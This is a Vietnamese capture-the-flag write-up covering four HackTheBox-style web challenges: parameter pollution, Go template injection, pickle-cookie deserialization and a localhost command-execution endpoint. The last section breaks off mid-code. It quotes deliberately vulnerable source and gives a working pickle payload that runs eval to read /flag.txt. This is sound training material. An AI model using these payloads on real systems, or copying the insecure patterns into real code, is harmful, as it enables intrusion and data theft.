+<p><img src="https://hackmd.io/_uploads/HJw-7NgLA.png" alt="image"></p>
+<ul>
+<li>TOC/TOU: <a href="https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use">https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use</a></li>
+</ul>
+<h2 id="htbank">HTBank</h2>
+<ul>
+<li>Một chall được viết bằng flask_frontend + php_backend + Mysql</li>
+</ul>
+<h3 id="php_backend">php_backend</h3>
+<pre><code>&lt;?php spl_autoload_register(function ($name) {
+    if (preg_match('/Controller$/', $name)) {
+        $name = &quot;controllers/${name}&quot;;
+    } elseif (preg_match('/Model$/', $name)) {
+        $name = &quot;models/${name}&quot;;
+    }
+    include_once &quot;${name}.php&quot;;
+});
+
+$database = new Database('localhost', 'xclow3n', 'xCl0w3n1337!!', 'web_htbank');
+$database-&gt;connect();
+
+$router = new Router();
+$router-&gt;new('POST', '/api/withdraw', 'WithdrawController@index');
+
+die($router-&gt;match());
+
+</code></pre><ul>
+<li>ở đây có một api duy nhất đó là <code>/api/withdraw</code> và logic của nó hoạt động như sau:</li>
+</ul>
+<pre><code>&lt;?php
+
+class WithdrawController extends Controller
+{
+    public function __construct()
+    {
+        parent::__construct();
+    }
+
+    public function index($router)
+    {
+        $amount = $_POST['amount'];
+        $account = $_POST['account'];
+
+        if ($amount == 1337) {
+            $this-&gt;database-&gt;query('UPDATE flag set show_flag=1');
+
+            return $router-&gt;jsonify([
+                'message' =&gt; 'OK'
+            ]);
+        }
+
+        return $router-&gt;jsonify([
+            'message' =&gt; 'We don\'t accept that amount'
+        ]);
+    }
+
+}
+</code></pre><ul>
+<li>ở đây sẽ nhận 2 tham số POST đó là amount và account -&gt; nếu amount == 1337 thì update bảng flag set show_flag=1 -&gt; trả ra ok nếu thành công.</li>
+</ul>
+<h3 id="flask_frontend">flask_frontend</h3>
+<ul>
+<li>ở đây ta có thể thấy có 2 route chính :</li>
+</ul>
+<pre><code>
+from flask import Flask
+from application.blueprints.routes import web, api
+from application.database import mysql
+from application.util import response
+
+app = Flask(__name__)
+app.config.from_object('application.config.Config')
+
+mysql.init_app(app)
+
+app.register_blueprint(web, url_prefix='/')
+app.register_blueprint(api, url_prefix='/api')
+
+@app.errorhandler(404)
+def not_found(error):
+    return response('404 Not Found'), 404
+
+@app.errorhandler(403)
+def forbidden(error):
+    return response('403 Forbidden'), 403
+
+@app.errorhandler(400)
+def bad_request(error):
+    return response('400 Bad Request'), 400
+
+@app.errorhandler(Exception)
+def handle_error(error):
+    message = error.description if hasattr(error, 'description') else [str(x) for x in error.args]
+    response = {
+        'error': {
+            'type': error.__class__.__name__,
+            'message': message
+        }
+    }
+
+    return response, error.code if hasattr(error, 'code') else 500
+</code></pre><ul>
+<li>Nó được import từ :</li>
+</ul>
+<pre><code>
+from application.database import *
+from flask import Blueprint, session, jsonify, redirect, render_template, request, make_response, current_app
+from application.util import response, isAuthenticated
+import datetime, sys, requests
+
+web = Blueprint('web', __name__)
+api = Blueprint('api', __name__)
+
+@web.route('/')
+def login():
+    return render_template('login.html')
+
+@web.route('/home')
+@isAuthenticated
+def home(decoded_token):
+    user = getUser(decoded_token.get('username'))
+    flag = getFlag()
+    
+    if(flag[0].get('show_flag') == 1):
+        return render_template('home.html', user=user[0], flag=flag[0].get('flag'))
+
+
+    return render_template('home.html', user=user[0])
+
+@web.route('/logout')
+def logout():
+    res = make_response(redirect('/'))
+    res.set_cookie('session', '', expires=0)
+    return res
+
+@api.route('/login', methods=['POST'])
+def api_login():
+    username = request.form.get('username', '')
+    password = request.form.get('password', '')
+        
+    if not username or not password:
+        return response('All fields are required!'), 401
+    
+    user = login_user_db(username, password)
+    
+    if user:
+        res = response('Logged in successfully!')
+        res.status_code = 200
+        res.set_cookie('session', user, expires=datetime.datetime.utcnow() + datetime.timedelta(minutes=360), httponly=False)
+        return res
+
+    return response('Invalid credentials!'), 403
+
+@api.route('/register', methods=['POST'])
+def api_register():
+    username = request.form.get('username', '')
+    password = request.form.get('password', '')
+    
+    if not username or not password:
+        return response('All fields are required!'), 401
+    
+    user = register_user_db(username, password)
+    
+    if user:
+        return response('User registered! Please login'), 200
+        
+    return response('User already exists!'), 403
+
+@api.route('/withdraw', methods=['POST'])
+@isAuthenticated
+def withdraw(decoded_token):
+    body = request.get_data()
+    amount = request.form.get('amount', '')
+    account = request.form.get('account', '')
+    
+    if not amount or not account:
+        return response('All fields are required!'), 401
+    
+    user = getUser(decoded_token.get('username'))
+
+    try:
+        if (int(user[0].get('balance')) &lt; int(amount) or int(amount) &lt; 0 ):
+            return response('Not enough credits!'), 400
+
+        res = requests.post(f&quot;http://{current_app.config.get('PHP_HOST')}/api/withdraw&quot;, 
+            headers={&quot;content-type&quot;: request.headers.get(&quot;content-type&quot;)}, data=body)
+        
+        jsonRes = res.json()
+
+        return response(jsonRes['message'])
+    except:
+        return response('Only accept number!'), 500
+</code></pre><ul>
+<li>Có thể thấy ở đây có các route /home sẽ nhận được flag khi show_flag=1 tức ra ta phải gọi đến api/withdraw kia của backend_php.</li>
+<li>Route /withdraw với method post nhận account và amount từ client -&gt; ::</li>
+</ul>
+<pre><code>if (int(user[0].get('balance')) &lt; int(amount) or int(amount) &lt; 0 ):
+            return response('Not enough credits!'), 400
+</code></pre><ul>
+<li>Lưu ý là khi gửi data đến be nó lại dùng <code>  body = request.get_data()</code> nên ta có thể lợi dụng để truyền 2 lần amount == 1337 và nhận flag:</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/rJAFmb_80.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/rJjnQb_8R.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/Byh4EZO8C.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/B13I4Z_U0.png" alt="image"></p>
+<p>Flag: <code>HTB{p4r4m3t3r_p0llut10n_4r3_1mp0rt4nt_p4tch_1t_B0NK!}</code></p>
+<h2 id="ghostlytemplates">GhostlyTemplates</h2>
+<ul>
+<li>một chall với golang + template -&gt; với tên chall thì ta có thể nghĩ đến nó là một vul với template mà chỉ có ssti được thôi -&gt; cùng vào phân tích source code:</li>
+</ul>
+<pre><code>
+package main
+
+import (
+	&quot;encoding/json&quot;
+	&quot;fmt&quot;
+	&quot;html/template&quot;
+	&quot;io&quot;
+	&quot;net/http&quot;
+	&quot;os&quot;
+	&quot;os/exec&quot;
+	&quot;path/filepath&quot;
+	&quot;strings&quot;
+)
+
+const WEB_PORT = &quot;1337&quot;
+const TEMPLATE_DIR = &quot;./templates&quot;
+
+type LocationInfo struct {
+	Status      string  `json:&quot;status&quot;`
+	Country     string  `json:&quot;country&quot;`
+	CountryCode string  `json:&quot;countryCode&quot;`
+	Region      string  `json:&quot;region&quot;`
+	RegionName  string  `json:&quot;regionName&quot;`
+	City        string  `json:&quot;city&quot;`
+	Zip         string  `json:&quot;zip&quot;`
+	Lat         float64 `json:&quot;lat&quot;`
+	Lon         float64 `json:&quot;lon&quot;`
+	Timezone    string  `json:&quot;timezone&quot;`
+	ISP         string  `json:&quot;isp&quot;`
+	Org         string  `json:&quot;org&quot;`
+	AS          string  `json:&quot;as&quot;`
+	Query       string  `json:&quot;query&quot;`
+}
+
+type MachineInfo struct {
+	Hostname      string
+	OS            string
+	KernelVersion string
+	Memory        string
+}
+
+type RequestData struct {
+	ClientIP     string
+	ClientUA     string
+	ServerInfo   MachineInfo
+	ClientIpInfo LocationInfo `json:&quot;location&quot;`
+}
+
+func GetServerInfo(command string) string {
+	out, err := exec.Command(&quot;sh&quot;, &quot;-c&quot;, command).Output()
+	if err != nil {
+		return &quot;&quot;
+	}
+	return string(out)
+}
+
+func (p RequestData) GetLocationInfo(endpointURL string) (*LocationInfo, error) {
+	resp, err := http.Get(endpointURL)
+	if err != nil {
+		return nil, err
+	}
+
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		return nil, fmt.Errorf(&quot;HTTP request failed with status code: %d&quot;, resp.StatusCode)
+	}
+
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return nil, err
+	}
+
+	var locationInfo LocationInfo
+	if err := json.Unmarshal(body, &amp;locationInfo); err != nil {
+		return nil, err
+	}
+
+	return &amp;locationInfo, nil
+}
+
+func (p RequestData) IsSubdirectory(basePath, path string) bool {
+	rel, err := filepath.Rel(basePath, path)
+	if err != nil {
+		return false
+	}
+	return !strings.HasPrefix(rel, &quot;..&quot;+string(filepath.Separator))
+}
+
+func (p RequestData) OutFileContents(filePath string) string {
+	data, err := os.ReadFile(filePath)
+	if err != nil {
+		return err.Error()
+	}
+	return string(data)
+}
+
+func readRemoteFile(url string) (string, error) {
+	response, err := http.Get(url)
+	if err != nil {
+		return &quot;&quot;, err
+	}
+
+	defer response.Body.Close()
+
+	if response.StatusCode != http.StatusOK {
+		return &quot;&quot;, fmt.Errorf(&quot;HTTP request failed with status code: %d&quot;, response.StatusCode)
+	}
+
+	content, err := io.ReadAll(response.Body)
+	if err != nil {
+		return &quot;&quot;, err
+	}
+
+	return string(content), nil
+}
+
+func getIndex(w http.ResponseWriter, r *http.Request) {
+	http.Redirect(w, r, &quot;/view?page=index.tpl&quot;, http.StatusMovedPermanently)
+}
+
+func getTpl(w http.ResponseWriter, r *http.Request) {
+	var page string = r.URL.Query().Get(&quot;page&quot;)
+	var remote string = r.URL.Query().Get(&quot;remote&quot;)
+
+	if page == &quot;&quot; {
+		http.Error(w, &quot;Missing required parameters&quot;, http.StatusBadRequest)
+		return
+	}
+
+	reqData := &amp;RequestData{}
+
+	userIPCookie, err := r.Cookie(&quot;user_ip&quot;)
+	clientIP := &quot;&quot;
+
+	if err == nil {
+		clientIP = userIPCookie.Value
+	} else {
+		clientIP = strings.Split(r.RemoteAddr, &quot;:&quot;)[0]
+	}
+
+	userAgent := r.Header.Get(&quot;User-Agent&quot;)
+
+	locationInfo, err := reqData.GetLocationInfo(&quot;https://freeipapi.com/api/json/&quot; + clientIP)
+
+	if err != nil {
+		http.Error(w, &quot;Could not fetch IP location info&quot;, http.StatusInternalServerError)
+		return
+	}
+
+	reqData.ClientIP = clientIP
+	reqData.ClientUA = userAgent
+	reqData.ClientIpInfo = *locationInfo
+	reqData.ServerInfo.Hostname = GetServerInfo(&quot;hostname&quot;)
+	reqData.ServerInfo.OS = GetServerInfo(&quot;cat /etc/os-release | grep PRETTY_NAME | cut -d '\&quot;' -f 2&quot;)
+	reqData.ServerInfo.KernelVersion = GetServerInfo(&quot;uname -r&quot;)
+	reqData.ServerInfo.Memory = GetServerInfo(&quot;free -h | awk '/^Mem/{print $2}'&quot;)
+
+	var tmplFile string
+
+	if remote == &quot;true&quot; {
+		tmplFile, err = readRemoteFile(page)
+
+		if err != nil {
+			http.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)
+			return
+		}
+	} else {
+		if !reqData.IsSubdirectory(&quot;./&quot;, TEMPLATE_DIR+&quot;/&quot;+page) {
+			http.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)
+			return
+		}
+
+		tmplFile = reqData.OutFileContents(TEMPLATE_DIR + &quot;/&quot; + page)
+	}
+
+	tmpl, err := template.New(&quot;page&quot;).Parse(tmplFile)
+	if err != nil {
+		http.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)
+		return
+	}
+
+	err = tmpl.Execute(w, reqData)
+	if err != nil {
+		http.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)
+		return
+	}
+}
+
+func main() {
+	mux := http.NewServeMux()
+
+	mux.HandleFunc(&quot;/&quot;, getIndex)
+	mux.HandleFunc(&quot;/view&quot;, getTpl)
+	mux.Handle(&quot;/static/&quot;, http.StripPrefix(&quot;/static/&quot;, http.FileServer(http.Dir(&quot;static&quot;))))
+
+	fmt.Println(&quot;Server started at port &quot; + WEB_PORT)
+	http.ListenAndServe(&quot;:&quot;+WEB_PORT, mux)
+}
+
+</code></pre><ul>
+<li>Có 2 route chính:</li>
+</ul>
+<pre><code>mux.HandleFunc(&quot;/&quot;, getIndex)
+mux.HandleFunc(&quot;/view&quot;, getTpl)
+</code></pre><ul>
+<li>/ chỉ đơn giản là trả ra <code>page=index.tpl</code></li>
+<li>/view route:</li>
+</ul>
+<pre><code>
+func getTpl(w http.ResponseWriter, r *http.Request) {
+	var page string = r.URL.Query().Get(&quot;page&quot;)
+	var remote string = r.URL.Query().Get(&quot;remote&quot;)
+
+	if page == &quot;&quot; {
+		http.Error(w, &quot;Missing required parameters&quot;, http.StatusBadRequest)
+		return
+	}
+
+	reqData := &amp;RequestData{}
+
+	userIPCookie, err := r.Cookie(&quot;user_ip&quot;)
+	clientIP := &quot;&quot;
+
+	if err == nil {
+		clientIP = userIPCookie.Value
+	} else {
+		clientIP = strings.Split(r.RemoteAddr, &quot;:&quot;)[0]
+	}
+
+	userAgent := r.Header.Get(&quot;User-Agent&quot;)
+
+	locationInfo, err := reqData.GetLocationInfo(&quot;https://freeipapi.com/api/json/&quot; + clientIP)
+
+	if err != nil {
+		http.Error(w, &quot;Could not fetch IP location info&quot;, http.StatusInternalServerError)
+		return
+	}
+
+	reqData.ClientIP = clientIP
+	reqData.ClientUA = userAgent
+	reqData.ClientIpInfo = *locationInfo
+	reqData.ServerInfo.Hostname = GetServerInfo(&quot;hostname&quot;)
+	reqData.ServerInfo.OS = GetServerInfo(&quot;cat /etc/os-release | grep PRETTY_NAME | cut -d '\&quot;' -f 2&quot;)
+	reqData.ServerInfo.KernelVersion = GetServerInfo(&quot;uname -r&quot;)
+	reqData.ServerInfo.Memory = GetServerInfo(&quot;free -h | awk '/^Mem/{print $2}'&quot;)
+
+	var tmplFile string
+
+	if remote == &quot;true&quot; {
+		tmplFile, err = readRemoteFile(page)
+
+		if err != nil {
+			http.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)
+			return
+		}
+	} else {
+		if !reqData.IsSubdirectory(&quot;./&quot;, TEMPLATE_DIR+&quot;/&quot;+page) {
+			http.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)
+			return
+		}
+
+		tmplFile = reqData.OutFileContents(TEMPLATE_DIR + &quot;/&quot; + page)
+	}
+
+	tmpl, err := template.New(&quot;page&quot;).Parse(tmplFile)
+	if err != nil {
+		http.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)
+		return
+	}
+
+	err = tmpl.Execute(w, reqData)
+	if err != nil {
+		http.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)
+		return
+	}
+}
+</code></pre><ul>
+<li>Nhận 2 parameter đó là page và remote -&gt; lấy cả <code>user_ip</code> từ cookie ủa người dùng -&gt; nhận <code>userAgent</code> -&gt; kiểm tra ip location nếu không có trả ra  error -&gt; khai báo biến <code>tmplFile</code> -&gt;  remote == &ldquo;true&rdquo; -&gt; gọi <code>tmplFile, err = readRemoteFile(page)</code>:</li>
+</ul>
+<pre><code>func readRemoteFile(url string) (string, error) {
+	response, err := http.Get(url)
+	if err != nil {
+		return &quot;&quot;, err
+	}
+
+	defer response.Body.Close()
+
+	if response.StatusCode != http.StatusOK {
+		return &quot;&quot;, fmt.Errorf(&quot;HTTP request failed with status code: %d&quot;, response.StatusCode)
+	}
+
+	content, err := io.ReadAll(response.Body)
+	if err != nil {
+		return &quot;&quot;, err
+	}
+
+	return string(content), nil
+}
+</code></pre><ul>
+<li>
+<p>Hàm này sẽ trả ra một string nhận về sau khi get đến url.</p>
+</li>
+<li>
+<p>Quay trở lại với luồng chính của chương trình -&gt; <code>tmpl, err := template.New(&quot;page&quot;).Parse(tmplFile)</code> -&gt; thực hiện render <code>err = tmpl.Execute(w, reqData)</code>.</p>
+</li>
+<li>
+<p>Nguyển nhân dẫn đến lỗ hổng : <a href="https://www.onsecurity.io/blog/go-ssti-method-research/">https://www.onsecurity.io/blog/go-ssti-method-research/</a></p>
+</li>
+</ul>
+<h3 id="exploit">Exploit</h3>
+<p><img src="https://hackmd.io/_uploads/SkMQT-_80.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/ryDyTbdUC.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/SJpgaZdIA.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/rJEHTWdLC.png" alt="image"></p>
+<p>flag: <code>HTB{t3mpl14t35_c4us3_p41n_4nd_f1l35_1nclud3s!}</code></p>
+<h2 id="spellbound-servants">Spellbound Servants</h2>
+<ul>
+<li>Tương tự như các chall python trước thì chall này cũng có 2 route chính:</li>
+</ul>
+<pre><code>from flask import Flask
+from application.blueprints.routes import web, api
+from application.database import mysql
+from application.util import response
+
+app = Flask(__name__)
+app.config.from_object('application.config.Config')
+
+mysql.init_app(app)
+
+app.register_blueprint(web, url_prefix='/')
+app.register_blueprint(api, url_prefix='/api')
+
+@app.errorhandler(404)
+def not_found(error):
+    return response('404 Not Found'), 404
+
+@app.errorhandler(403)
+def forbidden(error):
+    return response('403 Forbidden'), 403
+
+@app.errorhandler(400)
+def bad_request(error):
+    return response('400 Bad Request'), 400
+
+@app.errorhandler(Exception)
+def handle_error(error):
+    message = error.description if hasattr(error, 'description') else [str(x) for x in error.args]
+    response = {
+        'error': {
+            'type': error.__class__.__name__,
+            'message': message
+        }
+    }
+
+    return response, error.code if hasattr(error, 'code') else 500
+</code></pre><ul>
+<li>Đó là / và /api -&gt; cùng quan sát logic code -&gt;</li>
+</ul>
+<pre><code>from application.database import *
+from flask import Blueprint, redirect, render_template, request, make_response
+from application.util import response, isAuthenticated
+
+web = Blueprint('web', __name__)
+api = Blueprint('api', __name__)
+
+@web.route('/', methods=['GET', 'POST'])
+def loginView():
+    return render_template('login.html')
+
+@web.route('/register', methods=['GET', 'POST'])
+def registerView():
+    return render_template('register.html')
+
+@web.route('/home', methods=['GET', 'POST'])
+@isAuthenticated
+def homeView(user):
+    return render_template('index.html', user=user)
+
+@api.route('/login', methods=['POST'])
+def api_login():
+    if not request.is_json:
+        return response('Invalid JSON!'), 400
+    
+    data = request.get_json()
+    username = data.get('username', '')
+    password = data.get('password', '')
+    
+    if not username or not password:
+        return response('All fields are required!'), 401
+    
+    user = login_user_db(username, password)
+    
+    if user:
+        res = make_response(response('Logged In sucessfully'))
+        res.set_cookie('auth', user)
+        return res
+        
+    return response('Invalid credentials!'), 403
+
+@api.route('/register', methods=['POST'])
+def api_register():
+    if not request.is_json:
+        return response('Invalid JSON!'), 400
+    
+    data = request.get_json()
+    username = data.get('username', '')
+    password = data.get('password', '')
+    
+    if not username or not password:
+        return response('All fields are required!'), 401
+    
+    user = register_user_db(username, password)
+    
+    if user:
+        return response('User registered! Please login'), 200
+        
+    return response('User already exists!'), 403
+
+</code></pre><ul>
+<li>
+<p>Có thể thấy chương trình có các chức năng đó là reg,login, /, /home:</p>
+</li>
+<li>
+<p>Sau khi tiến hành đăng kí với username và password -&gt; tiến hành lưu user vào trong db:</p>
+</li>
+</ul>
+<pre><code>def register_user_db(username, password):
+    check_user = query('SELECT username FROM users WHERE username = %s', (username,), one=True)
+
+    if not check_user:
+        query('INSERT INTO users(username, password) VALUES(%s, %s)', (username, password,))
+        mysql.connection.commit()
+        
+        return True
+    
+    return False
+</code></pre><ul>
+<li>Tiếp theo login -&gt; server cũng nhận username và password từ người dùng -&gt;</li>
+</ul>
+<pre><code>def login_user_db(username, password):
+    user = query('SELECT username FROM users WHERE username = %s AND password = %s', (username, password,), one=True)
+    
+    if user:
+        pickled_data = base64.b64encode(pickle.dumps(user))
+        return pickled_data.decode(&quot;ascii&quot;) 
+    else:
+        return False
+</code></pre><ul>
+<li>
+<p>Tìm các bản ghi của username với username và password sau đó gọi <code>base64.b64encode(pickle.dumps</code> và trả ra <code>pickled_data.decode(&quot;ascii&quot;)</code></p>
+</li>
+<li>
+<p>Thì có vẻ vul ở đây như ta đã biết thì pickle mà ta control được thì có thể dẫn đến RCE ở python.</p>
+</li>
+<li>
+<p>Nếu đăng nhập thành công lưu vào cookie với <code>auth</code></p>
+</li>
+<li>
+<p>Đó chưa phải là chỗ gây ra lỗ hổng vul nằm ở middleware để check authentication cho người dùng.</p>
+</li>
+</ul>
+<pre><code>
+def isAuthenticated(f):
+    @wraps(f)
+    def decorator(*args, **kwargs):
+        token = request.cookies.get('auth', False)
+
+        if not token:
+            return abort(401, 'Unauthorised access detected!')
+        
+        try:
+            user = pickle.loads(base64.urlsafe_b64decode(token))
+            kwargs['user'] = user
+            return f(*args, **kwargs)
+        except:
+            return abort(401, 'Unauthorised access detected!')
+
+    return decorator
+</code></pre><ul>
+<li>
+<p>như ta thấy thì server nhận <code>auth</code> từ cookie sau đó gọi <code>pickle.loads(base64.urlsafe_b64decode(token))</code> và gắn giá trị cho các session của user.</p>
+</li>
+<li>
+<p>Vậy thì vul ở đây</p>
+</li>
+</ul>
+<h3 id="flow-2">Flow</h3>
+<ul>
+<li>
+<p>Register -&gt; login -&gt; quan sát quá trình hoạt động nếu bạn là beginer.</p>
+</li>
+<li>
+<p>Nếu hiểu rõ rồi thì chỉ cần gen payload rce -&gt; base64-en -&gt; gắn vào cookie auth -&gt; /home và nhận flag.</p>
+</li>
+<li>
+<p>Xem vị trí của flag nằm ở /flag.txt</p>
+</li>
+</ul>
+<pre><code>FROM python:3.11-alpine
+
+# Install packages
+RUN apk update \
+    &amp;&amp; apk add --no-cache --update mariadb mariadb-dev mariadb-client supervisor gcc musl-dev mariadb-connector-c-dev
+
+# Upgrade pip
+RUN python -m pip install --upgrade pip
+
+# Copy flag
+COPY flag.txt /flag.txt
+
+# Setup app
+RUN mkdir -p /app
+
+# Switch working environment
+WORKDIR /app
+
+# Add application
+COPY challenge .
+
+# Install dependencies
+RUN pip install --no-cache-dir -r requirements.txt
+
+# Setup supervisor
+COPY config/supervisord.conf /etc/supervisord.conf
+
+# Expose port the server is reachable on
+EXPOSE 1337
+
+# Disable pycache
+ENV PYTHONDONTWRITEBYTECODE=1
+
+# create database and start supervisord
+COPY --chown=root entrypoint.sh /entrypoint.sh
+RUN chmod +x /entrypoint.sh
+ENTRYPOINT [&quot;/entrypoint.sh&quot;]
+</code></pre><h3 id="exploit-1">Exploit</h3>
+<ul>
+<li>vul pickle serial to RCE</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/ByJEotqIA.png" alt="image"></p>
+<p>poc:</p>
+<pre><code>import pickle, base64
+
+class test:
+    def __reduce__(self):
+        p=&quot;open('/flag.txt').read()&quot;
+        return (eval,(p,))
+
+rs={'username':test()}
+
+print(base64.b64encode(pickle.dumps(rs)).decode('utf8'))
+
+</code></pre><p>flag: <code>HTB{sp3l1_0f_the_p1ckl3!}</code></p>
+<h2 id="pumpkinspice">PumpkinSpice</h2>
+<ul>
+<li>Một chall với source code python_flask:</li>
+</ul>
+<pre><code>
+import string, time, subprocess
+from flask import Flask, request, render_template, abort
+from threading import Thread
+
+app = Flask(__name__)
+
+addresses = []
+
+def start_bot():
+    from selenium import webdriver
+    from selenium.webdriver.chrome.options import Options
+    from selenium.webdriver.chrome.service import Service
+    from selenium.webdriver.support.ui import WebDriverWait
+
+    host, port = &quot;localhost&quot;, 1337
+    HOST = f&quot;http://{host}:{port}&quot;
+
+    options = Options()
+
+    options.add_argument(&quot;--headless&quot;)
+    options.add_argument(&quot;--no-sandbox&quot;)
+    options.add_argument(&quot;--disable-dev-shm-usage&quot;)
+    options.add_argument(&quot;--disable-infobars&quot;)
+    options.add_argument(&quot;--disable-background-networking&quot;)
+    options.add_argument(&quot;--disable-default-apps&quot;)
+    options.add_argument(&quot;--disable-extensions&quot;)
+    options.add_argument(&quot;--disable-gpu&quot;)
+    options.add_argument(&quot;--disable-sync&quot;)
+    options.add_argument(&quot;--disable-translate&quot;)
+    options.add_argument(&quot;--hide-scrollbars&quot;)
+    options.add_argument(&quot;--metrics-recording-only&quot;)
+    options.add_argument(&quot;--mute-audio&quot;)
+    options.add_argument(&quot;--no-first-run&quot;)
+    options.add_argument(&quot;--dns-prefetch-disable&quot;)
+    options.add_argument(&quot;--safebrowsing-disable-auto-update&quot;)
+    options.add_argument(&quot;--media-cache-size=1&quot;)
+    options.add_argument(&quot;--disk-cache-size=1&quot;)
+    options.add_argument(&quot;--user-agent=HTB/1.0&quot;)
+
+    service = Service(executable_path=&quot;/usr/bin/chromedriver&quot;)
+    browser = webdriver.Chrome(service=service, options=options)
+
+    browser.get(f&quot;{HOST}/addresses&quot;)
+    time.sleep(5)
+    browser.quit()
+
+
+@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])
+def index():
+    return render_template(&quot;index.html&quot;)
+
+
+@app.route(&quot;/addresses&quot;, methods=[&quot;GET&quot;])
+def all_addresses():
+    remote_address = request.remote_addr
+    if remote_address != &quot;127.0.0.1&quot; and remote_address != &quot;::1&quot;:
+        return render_template(&quot;index.html&quot;, message=&quot;Only localhost allowed&quot;)
+
+    return render_template(&quot;addresses.html&quot;, addresses=addresses)
+
+
+@app.route(&quot;/add/address&quot;, methods=[&quot;POST&quot;])
+def add_address():
+    address = request.form.get(&quot;address&quot;)
+    
+    if not address:
+        return render_template(&quot;index.html&quot;, message=&quot;No address provided&quot;)
+
+    addresses.append(address)
+    Thread(target=start_bot,).start()
+    return render_template(&quot;index.html&quot;, message=&quot;Address registered&quot;)
+
+
+@app.route(&quot;/api/stats&quot;, methods=[&quot;GET&quot;])
+def stats():
+    remote_address = request.remote_addr
+    if remote_address != &quot;127.0.0.1&quot; and remote_address != &quot;::1&quot;:
+        return render_template(&quot;index.html&quot;, message=&quot;Only localhost allowed&quot;)
+
+    command = request.args.get(&quot;command&quot;)
+    if not command:
+        return render_template(&quot;index.html&quot;, message=&quot;No command provided&quot;)
+
+    results = subprocess.check_output(command, shell=True, universal_newlines=True)
+    return results
+
+
+if __name__ == &quot;__main__&quot;:
+    app.run(host=&quot;0.0.0.0&quot;, port=1337, debug=False)
+
+</code></pre><ul>
+<li>Đầu tiên chúng ta sẽ quan sát vị trí của flag nằm ở <code>/flag.txt</code>:</li>
+</ul>
+<pre><code>FROM python:3.11-alpine
+
+# Setup usr
+RUN adduser -D -u 1000 -g 1000 -s /bin/sh www
+
+# Install dependencies
+RUN apk add --update --no-cache gcc g++ make openssl-dev
+
+# Install packages
+RUN apk add --update --no-cache supervisor chromium chromium-chromedriver
+
+# Copy flag
+COPY flag.txt /flag.txt
+
+# Upgrade pip
+RUN python -m pip install --upgrade pip
+
+# Setup app
+RUN mkdir -p /app
+
+# Switch working environment
+WORKDIR /app
+
+# Add application
+COPY challenge .
+
+# Install dependencies
+RUN pip install -r requirements.txt
+
+# Copy configs
+COPY config/supervisord.conf /etc/supervisord.conf
+
+# Expose port the server is reachable on
+EXPOSE 1337
+
+# Disable pycache
+ENV PYTHONDONTWRITEBYTECODE=1
+
+# Copy entrypoint
+COPY --chown=root entrypoint.sh /entrypoint.sh
+RUN chmod +x /entrypoint.sh
+ENTRYPOINT [&quot;/entrypoint.sh&quot;]
+</code></pre><ul>
+<li>
+<p>Từ vị trí của nó ta có thể thấy là vấn đề ở đây là RCE để nhận được flag nằm ở root -&gt; bắt đầu đi tìm hook tại app.py.</p>
+</li>
+<li>
+<p>Ta có thể thấy ngay ở đây là api <code>/api/stats</code>:</p>
+</li>
+</ul>
+<pre><code>@app.route(&quot;/api/stats&quot;, methods=[&quot;GET&quot;])
+def stats():
+    remote_address = request.remote_addr
+    if remote_address != &quot;127.0.0.1&quot; and remote_address != &quot;::1&quot;:
+        return render_template(&quot;index.html&quot;, message=&quot;Only localhost allowed&quot;)
+
+    command = request.args.get(&quot;command&quot;)
+    if not command:
+        return render_template(&quot;index.html&quot;, message=&quot;No command provided&quot;)
+
+    results = subprocess.check_output(command, shell=True, universal_newlines=True)
+    return results
+</code></pre><ul>
+<li>ở đây sẽ có một <code>subprocess</code> được gọi để chạy command được truyền vào với method GET.</li>
+<li>Quan sát nhanh thì yêu cầu localhost và nhận param command -&gt; chạy command này và trả ra kết quả -&gt; vấn đề là bypass được localhost.</li>
+<li>Cùng để ý server có một mảng <code>addresses = []</code> để lưu trữ lại các địa chỉ và hiển thị ra template `<!-- raw HTML omitted --></li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>Mình có 2 ý tưởng ở đây đó là SSTI hoặc XSS nhưng hãy để ý đến logic code bình thường của nó ở đây.</p>
+</li>
+<li>
+<p>Ta thấy đây là nơi khả nghi mà ta có thể truy cập mà không cần localhost:</p>
+</li>
+</ul>
+<pre><code>
+@app.route(&quot;/add/address&quot;, methods=[&quot;POST&quot;])
+def add_address():
+    address = request.form.get(&quot;address&quot;)
+    
+    if not address:
+        return render_template(&quot;index.html&quot;, message=&quot;No address provided&quot;)
+
+    addresses.append(address)
+    Thread(target=start_bot,).start()
+    return render_template(&quot;index.html&quot;, message=&quot;Address registered&quot;)
+</code></pre><ul>
+<li>method POST nhận address sau đó push address vào trong mảng ở trên -&gt; tạo một thread và start với hàm start bot</li>
+<li>Cùng quan sát hàm start_bot():</li>
+</ul>
+<pre><code>def start_bot():
+    from selenium import webdriver
+    from selenium.webdriver.chrome.options import Options
+    from selenium.webdriver.chrome.service import Service
+    from selenium.webdriver.support.ui import WebDriverWait
+
+    host, port = &quot;localhost&quot;, 1337
+    HOST = f&quot;http://{host}:{port}&quot;
+
+    options = Options()
+
+    options.add_argument(&quot;--headless&quot;)
+    options.add_argument(&quot;--no-sandbox&quot;)
+    options.add_argument(&quot;--disable-dev-shm-usage&quot;)
+    options.add_argument(&quot;--disable-infobars&quot;)
+    options.add_argument(&quot;--disable-background-networking&quot;)
+    options.add_argument(&quot;--disable-default-apps&quot;)
+    options.add_argument(&quot;--disable-extensions&quot;)
+    options.add_argument(&quot;--disable-gpu&quot;)
+    options.add_argument(&quot;--disable-sync&quot;)
